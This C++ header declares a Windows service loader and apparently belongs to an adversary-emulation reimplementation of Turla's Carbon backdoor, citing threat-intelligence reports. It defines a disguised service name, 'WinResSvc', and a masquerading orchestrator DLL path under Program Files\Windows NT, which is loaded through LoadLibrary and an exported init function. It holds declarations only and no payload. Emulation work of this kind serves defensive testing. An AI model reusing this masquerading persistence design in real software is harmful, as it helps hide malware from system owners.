/*
 * Handle loader DLL service logic.
 *
 * CTI references:
 * [1] https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 * [2] https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html
 * [3] https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra
 */

#ifndef LOADER_SERVICE_H_
#define LOADER_SERVICE_H_

#include <windows.h>
#include <synchapi.h>
#include <winsvc.h>

#define SERVICE_NAME TEXT("WinResSvc")
#define ORCHESTRATOR_PATH TEXT("C:\\Program Files\\Windows NT\\MSSVCCFG.dll")
#define ORCHESTRATOR_INIT_FUNC_NAME "CompCreate"
#define SVC_ERROR ((DWORD)0x100)
#define SVC_INFO ((DWORD)0x101)
#define FAILURE_REGISTER_SVC_CTRL_HANDLER 0x200

// void ModuleInit(void)
typedef void(__stdcall* fp_module_init)();

namespace loader_service {

extern SERVICE_STATUS serviceStatus;
extern SERVICE_STATUS_HANDLE serviceStatusHandle;
extern HANDLE hServiceStopEvent;

// Interface for API calls to be wrapped. Will be used in source code and test files.
class LoaderSvcWrapperInterface {
public:
    LoaderSvcWrapperInterface(){}
    virtual ~LoaderSvcWrapperInterface(){}
    
    // Wrapper for RegisterServiceCtrlHandlerEx (winsvc.h)
    virtual SERVICE_STATUS_HANDLE RegisterServiceCtrlHandlerExWrapper(LPCTSTR lpServiceName, LPHANDLER_FUNCTION_EX lpHandlerProc, LPVOID lpContext) = 0;
    
    // Wrapper for CreateEvent (synchapi.h)
    virtual HANDLE CreateEventWrapper(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName) = 0;

    // Wrapper for WaitForSingleObject (synchapi.h)
    virtual DWORD WaitForSingleObjectWrapper(HANDLE hHandle, DWORD dwMilliseconds) = 0;
    
    // Wrapper for SetEvent (synchapi.h)
    virtual BOOL SetEventWrapper(HANDLE hEvent) = 0;
    
    // Wrapper for SetServiceStatus (winsvc.h)
    virtual BOOL SetServiceStatusWrapper(SERVICE_STATUS_HANDLE hServiceStatus, LPSERVICE_STATUS lpServiceStatus) = 0;

    // Wrapper for RegisterEventSource (winbase.h)
    virtual HANDLE RegisterEventSourceWrapper(LPCTSTR lpUNCServerName, LPCTSTR lpSourceName) = 0;

    // Wrapper for DeregisterEventSource (winbase.h)
    virtual BOOL DeregisterEventSourceWrapper(HANDLE hEventLog) = 0;

    // Wrapper for ReportEvent (winbase.h)
    virtual BOOL ReportEventWrapper(
        HANDLE  hEventLog,
        WORD    wType,
        WORD    wCategory,
        DWORD   dwEventID,
        PSID    lpUserSid,
        WORD    wNumStrings,
        DWORD   dwDataSize,
        LPCTSTR *lpStrings,
        LPVOID  lpRawData
    ) = 0;

    // Wrapper for LoadLibrary (libloaderapi.h)
    virtual HMODULE LoadLibraryWrapper(LPCTSTR lpLibFileName) = 0;

    // Wrapper for GetProcAddress (libloaderapi.h)
    virtual FARPROC GetProcAddressWrapper(HMODULE hModule, LPCSTR lpProcName) = 0;

    // Wrapper to execute the actual ModuleInit function
    virtual void ModuleInitWrapper(fp_module_init fp_init_func) = 0;
};

class LoaderSvcWrapper : public LoaderSvcWrapperInterface {
public:
	SERVICE_STATUS_HANDLE RegisterServiceCtrlHandlerExWrapper(LPCTSTR lpServiceName, LPHANDLER_FUNCTION_EX lpHandlerProc, LPVOID lpContext);
    HANDLE CreateEventWrapper(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
    DWORD WaitForSingleObjectWrapper(HANDLE hHandle, DWORD dwMilliseconds);
    BOOL SetEventWrapper(HANDLE hEvent);
    BOOL SetServiceStatusWrapper(SERVICE_STATUS_HANDLE hServiceStatus, LPSERVICE_STATUS lpServiceStatus);
    HANDLE RegisterEventSourceWrapper(LPCTSTR lpUNCServerName, LPCTSTR lpSourceName);
    BOOL DeregisterEventSourceWrapper(HANDLE hEventLog);
    BOOL ReportEventWrapper(
        HANDLE  hEventLog,
        WORD    wType,
        WORD    wCategory,
        DWORD   dwEventID,
        PSID    lpUserSid,
        WORD    wNumStrings,
        DWORD   dwDataSize,
        LPCTSTR *lpStrings,
        LPVOID  lpRawData
    );
    HMODULE LoadLibraryWrapper(LPCTSTR lpLibFileName);
    FARPROC GetProcAddressWrapper(HMODULE hModule, LPCSTR lpProcName);
    void ModuleInitWrapper(fp_module_init fp_init_func);
};

int PrepService(LoaderSvcWrapperInterface* wrapper);

VOID ReportServiceStatus(LoaderSvcWrapperInterface* wrapper, DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint);

DWORD WINAPI ServiceCtrlHandler(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext);

VOID BeginService(LoaderSvcWrapperInterface* wrapper, DWORD dwNumServicesArgs, LPSTR *lpServiceArgVectors);

VOID LogEvent(LoaderSvcWrapperInterface* wrapper, LPCTSTR message, WORD event_type, DWORD event_identifier);

VOID RunModule(LoaderSvcWrapperInterface* wrapper, LPCTSTR module_path, LPCSTR function_name);

} // namespace service_handler

#endif
